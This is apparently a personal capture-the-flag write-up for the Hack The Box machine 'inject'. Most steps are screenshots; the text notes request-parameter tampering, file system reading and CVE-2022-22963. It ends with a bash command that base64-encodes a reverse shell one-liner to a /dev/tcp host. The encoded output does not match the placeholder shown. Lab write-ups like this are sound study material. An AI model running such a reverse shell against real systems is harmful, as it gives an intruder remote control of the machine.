---
publish: true
tags:
  - Linux
  - Easy
---
---
# Reconnaissance 

![[Pasted image 20260109225402.png]]

 ---
# Foothold

![[Pasted image 20260109231608.png]]
![[Pasted image 20260109231623.png]]
![[Pasted image 20260109231650.png]]
If we intercept this request we're able to easily manipulate the parameters.
![[Pasted image 20260109231746.png]]
We're able to look into the file system
![[Pasted image 20260109232324.png]]
 CVE-2022-22963
![[Pasted image 20260109235052.png]]
```bash
󰣇 offsec/htb/inject ❯ echo "sh -i >& /dev/tcp/YOUR_IP/4444 0>&1" | base64    
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTcvNDQ0NCAwPiYxCg==

```